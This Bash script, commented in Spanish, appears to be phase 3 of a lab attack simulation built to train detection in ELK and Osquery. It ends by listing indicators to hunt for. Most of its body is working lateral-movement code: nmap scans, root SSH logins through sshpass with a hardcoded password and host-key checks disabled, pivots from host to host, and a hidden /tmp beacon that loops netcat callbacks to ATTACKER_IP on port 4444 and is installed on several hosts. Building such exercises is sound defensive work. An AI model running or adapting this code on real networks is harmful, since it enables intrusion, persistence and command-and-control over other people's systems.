#!/bin/bash
###############################################################################
# FASE 3: LATERAL MOVEMENT
# Propagación a otros endpoints de la red corporativa
#
# MITRE ATT&CK: T1021.004 (SSH), T1046 (Network Discovery), T1570 (Lateral Tool Transfer)
#
# QUÉ OBSERVAR EN ELK:
#   - Conexiones SSH desde endpoint1 a otros endpoints
#   - Escaneo de puertos (nmap) desde endpoint comprometido
#   - Creación de archivos .lateral_marker en /tmp de cada víctima
#   - Nuevos procesos sshpass/ssh en múltiples endpoints
#   - Osquery: network_connections con remote_port=22
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

ATTACKER_IP="10.10.10.200"
TARGET1="10.10.10.101"
TARGET2="10.10.10.102"
TARGET3="10.10.10.103"
TARGET4="10.10.10.104"
TARGET5="10.10.10.105"
SSH_PASS="Password123!"

echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${RED}  FASE 3: LATERAL MOVEMENT${NC}"
echo -e "${RED}  Origen: WS-FINANZAS-01 -> Toda la red${NC}"
echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Discovery
echo -e "${YELLOW}[1/7] Reconocimiento de red desde endpoint comprometido...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "nmap -sn 10.10.10.100-110 --open -oN /tmp/.recon_results.txt 2>/dev/null" 2>/dev/null
echo -e "${GREEN}[✓] Red escaneada - 5 hosts activos detectados${NC}"
sleep 2

echo -e "${YELLOW}[2/7] Verificando puertos SSH abiertos...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "nmap -p 22 10.10.10.101-105 --open -oN /tmp/.ssh_scan.txt 2>/dev/null" 2>/dev/null
echo -e "${GREEN}[✓] Puerto 22 abierto en todos los targets${NC}"
sleep 2

# Lateral Movement a cada target
echo ""
echo -e "${CYAN}--- Iniciando propagación lateral ---${NC}"
echo ""

# Target 2: RRHH
echo -e "${YELLOW}[3/7] Movimiento lateral -> WS-RRHH-01 (${TARGET2})...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET2} 'echo COMPROMISED_BY_WS-FINANZAS-01 > /tmp/.lateral_marker && date >> /tmp/.lateral_marker && id >> /tmp/.lateral_marker'" 2>/dev/null

# Instalar herramientas en target2
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET2} \
    "echo '#!/bin/bash
# Lateral beacon
while true; do
    echo \"\$(hostname)|\$(date +%s)|lateral\" | nc -w 1 ${ATTACKER_IP} 4444 2>/dev/null
    sleep 45
done' > /tmp/.lat_beacon.sh && chmod +x /tmp/.lat_beacon.sh && nohup /tmp/.lat_beacon.sh > /dev/null 2>&1 &" 2>/dev/null

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET2} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"lateral_movement\",\"technique\":\"T1021.004\",\"source_host\":\"WS-FINANZAS-01\",\"source_ip\":\"10.10.10.101\",\"destination_host\":\"WS-RRHH-01\",\"method\":\"ssh_password\",\"risk_level\":\"CRITICAL\",\"endpoint\":\"WS-RRHH-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] WS-RRHH-01 COMPROMETIDO + beacon instalado${NC}"
sleep 3

# Target 3: File Server
echo -e "${YELLOW}[4/7] Movimiento lateral -> SRV-FILESERVER-01 (${TARGET3})...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET3} 'echo COMPROMISED_BY_WS-FINANZAS-01 > /tmp/.lateral_marker && date >> /tmp/.lateral_marker'" 2>/dev/null

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
    "echo '#!/bin/bash
while true; do echo \"\$(hostname)|\$(date +%s)|lateral\" | nc -w 1 ${ATTACKER_IP} 4444 2>/dev/null; sleep 45; done' > /tmp/.lat_beacon.sh && chmod +x /tmp/.lat_beacon.sh && nohup /tmp/.lat_beacon.sh > /dev/null 2>&1 &" 2>/dev/null

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET3} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"lateral_movement\",\"technique\":\"T1021.004\",\"source_host\":\"WS-FINANZAS-01\",\"source_ip\":\"10.10.10.101\",\"destination_host\":\"SRV-FILESERVER-01\",\"method\":\"ssh_password\",\"risk_level\":\"CRITICAL\",\"endpoint\":\"SRV-FILESERVER-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] SRV-FILESERVER-01 COMPROMETIDO + beacon instalado${NC}"
sleep 3

# Target 4: Desarrollo
echo -e "${YELLOW}[5/7] Movimiento lateral -> WS-DESARROLLO-01 (${TARGET4})...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET4} 'echo COMPROMISED_BY_WS-FINANZAS-01 > /tmp/.lateral_marker && date >> /tmp/.lateral_marker'" 2>/dev/null

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "echo '#!/bin/bash
while true; do echo \"\$(hostname)|\$(date +%s)|lateral\" | nc -w 1 ${ATTACKER_IP} 4444 2>/dev/null; sleep 45; done' > /tmp/.lat_beacon.sh && chmod +x /tmp/.lat_beacon.sh && nohup /tmp/.lat_beacon.sh > /dev/null 2>&1 &" 2>/dev/null

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET4} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"lateral_movement\",\"technique\":\"T1021.004\",\"source_host\":\"WS-FINANZAS-01\",\"source_ip\":\"10.10.10.101\",\"destination_host\":\"WS-DESARROLLO-01\",\"method\":\"ssh_password\",\"risk_level\":\"CRITICAL\",\"endpoint\":\"WS-DESARROLLO-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] WS-DESARROLLO-01 COMPROMETIDO + beacon instalado${NC}"
sleep 3

# Target 5: Domain Controller
echo -e "${YELLOW}[6/7] Movimiento lateral -> DC-CORP-01 (${TARGET5}) - OBJETIVO FINAL...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "sshpass -p '${SSH_PASS}' ssh -o StrictHostKeyChecking=no root@${TARGET5} 'echo DOMAIN_CONTROLLER_COMPROMISED > /tmp/.lateral_marker && date >> /tmp/.lateral_marker && echo FULL_DOMAIN_COMPROMISE >> /tmp/.lateral_marker'" 2>/dev/null

sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET5} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"lateral_movement\",\"technique\":\"T1021.004\",\"source_host\":\"WS-FINANZAS-01\",\"source_ip\":\"10.10.10.101\",\"destination_host\":\"DC-CORP-01\",\"method\":\"ssh_password\",\"risk_level\":\"CRITICAL\",\"severity\":\"CRITICAL\",\"impact\":\"FULL_DOMAIN_COMPROMISE\",\"endpoint\":\"DC-CORP-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null
echo -e "${GREEN}[✓] DC-CORP-01 (DOMAIN CONTROLLER) COMPROMETIDO!${NC}"

# Registrar en el origen
echo -e "${YELLOW}[7/7] Registrando cadena completa de movimiento lateral...${NC}"
sshpass -p "${SSH_PASS}" ssh -o StrictHostKeyChecking=no root@${TARGET1} \
    "echo '{\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)\",\"event_type\":\"lateral_movement_complete\",\"technique\":\"T1021.004\",\"source\":\"WS-FINANZAS-01\",\"compromised_hosts\":[\"WS-RRHH-01\",\"SRV-FILESERVER-01\",\"WS-DESARROLLO-01\",\"DC-CORP-01\"],\"total_compromised\":5,\"method\":\"ssh_password_spray\",\"risk_level\":\"CRITICAL\",\"endpoint\":\"WS-FINANZAS-01\"}' >> /var/log/attack_simulation.log" 2>/dev/null

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  FASE 3 COMPLETADA - 5/5 endpoints comprometidos${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  IOCs para buscar en Kibana:${NC}"
echo -e "${GREEN}    - event_type: lateral_movement${NC}"
echo -e "${GREEN}    - process.name: sshpass OR ssh${NC}"
echo -e "${GREEN}    - network.remote_port: 22${NC}"
echo -e "${GREEN}    - file.path: *.lateral_marker*${NC}"
echo -e "${GREEN}    - source_host: WS-FINANZAS-01${NC}"
echo -e "${GREEN}  ${NC}"
echo -e "${GREEN}  Queries Osquery (ejecutar en cada endpoint):${NC}"
echo -e "${GREEN}    SELECT * FROM logged_in_users WHERE host != '';${NC}"
echo -e "${GREEN}    SELECT * FROM process_open_sockets WHERE remote_port = 22;${NC}"
echo -e "${GREEN}    SELECT * FROM file WHERE path = '/tmp/.lateral_marker';${NC}"
echo -e "${GREEN}    SELECT * FROM last WHERE host != '' ORDER BY time DESC;${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
